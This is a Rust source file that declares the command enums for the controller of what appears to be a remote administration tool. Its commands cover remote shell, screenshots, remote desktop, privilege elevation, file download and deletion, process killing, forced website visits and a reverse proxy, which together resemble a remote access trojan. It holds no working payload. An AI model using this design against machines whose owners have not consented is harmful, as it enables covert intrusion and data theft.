/// Commands used internally for communication between connections and channel loop
use common::packets::*;
use std::net::SocketAddr;

use tokio::sync::{mpsc::Sender, oneshot::Sender as OSender};
use crate::handlers::{FrontClient, AssemblyInfo};
use crate::server::Log;
use tauri::AppHandle;

/// Commands sent to client-server connection handlers.
#[derive(Debug)]
pub enum ClientCommand {
    Write(ClientboundPacket),
    SetSecret(Option<Vec<u8>>),
    Close,
}

/// Commands sent to server-client connection handlers.
#[derive(Debug)]
pub enum ServerCommand {
    EncryptionRequest(Sender<ClientCommand>, OSender<Vec<u8>>),
    EncryptionConfirm(
        Sender<ClientCommand>,
        OSender<Result<Vec<u8>, ()>>,
        Vec<u8>,
        Vec<u8>,
        Vec<u8>,
    ),
    RegisterClient(Sender<ClientCommand>, SocketAddr, ClientInfo),

    TakeScreenshot(SocketAddr, String),
    ScreenshotData(SocketAddr, Vec<u8>),

    DisconnectClient(SocketAddr),
    ReconnectClient(SocketAddr),
    Log(Log),

    StartRemoteDesktop(SocketAddr, RemoteDesktopConfig),
    StopRemoteDesktop(SocketAddr),
    MouseClick(SocketAddr, MouseClickData),
    RemoteDesktopFrame(SocketAddr, RemoteDesktopFrame),

    GetClients(OSender<Vec<FrontClient>>),
    GetClient(SocketAddr, OSender<Option<FrontClient>>),
    SetTauriHandle(AppHandle),
    ClientDisconnected(SocketAddr),
    CloseClientSessions(),

    VisitWebsite(SocketAddr, VisitWebsiteData),

    ShowMessageBox(SocketAddr, MessageBoxData),

    ElevateClient(SocketAddr),

    
    ManageSystem(SocketAddr, String),

    GetProcessList(SocketAddr),
    ProcessList(SocketAddr, ProcessList),
    KillProcess(SocketAddr, Process),

    StartShell(SocketAddr),
    ExitShell(SocketAddr),
    ShellCommand(SocketAddr, String),
    ShellOutput(SocketAddr, String),

    PreviousDir(SocketAddr),
    ViewDir(SocketAddr, String),
    AvailableDisks(SocketAddr),
    RemoveDir(SocketAddr, String),
    RemoveFile(SocketAddr, String),
    DownloadFile(SocketAddr, String),

    DisksResult(SocketAddr, Vec<String>),
    FileList(SocketAddr, Vec<File>),
    CurrentFolder(SocketAddr, String),
    DownloadFileResult(SocketAddr, FileData),

    StartReverseProxy(SocketAddr, String, String),
    StopReverseProxy(SocketAddr),
}   
